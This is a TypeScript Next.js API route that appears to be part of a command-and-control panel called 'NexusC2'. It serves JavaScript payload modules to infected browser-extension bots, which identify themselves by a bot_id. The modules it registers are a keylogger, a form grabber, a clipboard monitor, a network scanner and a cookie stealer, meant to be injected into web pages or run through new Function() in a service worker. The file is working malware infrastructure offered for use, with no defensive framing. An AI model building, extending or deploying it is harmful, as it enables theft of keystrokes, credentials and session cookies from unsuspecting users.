import { NextRequest, NextResponse } from "next/server";
import { readFileSync, existsSync } from "fs";
import { join } from "path";

// Module metadata: maps module names to their execution context
// "background" = runs in service worker via new Function()
// "content" = injected into web pages via chrome.scripting.executeScript
const MODULE_META: Record<string, { file: string; context: "background" | "content" }> = {
    keylogger: { file: "keylogger.js", context: "content" },
    form_grabber: { file: "form_grabber.js", context: "content" },
    clipboard_monitor: { file: "clipboard_monitor.js", context: "content" },
    network_scanner: { file: "network_scanner.js", context: "background" },
    cookie_stealer: { file: "cookie_stealer.js", context: "background" },
};

// Inline module registry — for serverless deployment where filesystem is unavailable
// Populated at build time or manually. In production, use Supabase Storage instead.
const INLINE_MODULES: Record<string, string> = {};

function getModuleCode(name: string): string | null {
    // 1. Try inline registry first (for production/serverless)
    if (INLINE_MODULES[name]) return INLINE_MODULES[name];

    // 2. Try filesystem (for local development)
    const meta = MODULE_META[name];
    if (!meta) return null;

    // Look for modules in the NexusC2-Stager/modules directory (sibling to dashboard)
    const modulePaths = [
        join(process.cwd(), "..", "NexusC2-Stager", "modules", meta.file),
        join(process.cwd(), "modules", meta.file),
    ];

    for (const modPath of modulePaths) {
        try {
            if (existsSync(modPath)) {
                return readFileSync(modPath, "utf-8");
            }
        } catch { /* try next path */ }
    }

    return null;
}

export async function GET(request: NextRequest) {
    try {
        const moduleName = request.nextUrl.searchParams.get("name");
        const botId = request.nextUrl.searchParams.get("bot_id");

        if (!moduleName || !botId) {
            return new NextResponse("Missing params", { status: 400 });
        }

        const moduleCode = getModuleCode(moduleName);

        if (!moduleCode) {
            return new NextResponse("Module not found", { status: 404 });
        }

        return new NextResponse(moduleCode, {
            headers: {
                "Content-Type": "application/javascript",
                "Cache-Control": "no-store",
            },
        });
    } catch (e) {
        console.error("Module fetch error:", e);
        return new NextResponse("Internal error", { status: 500 });
    }
}
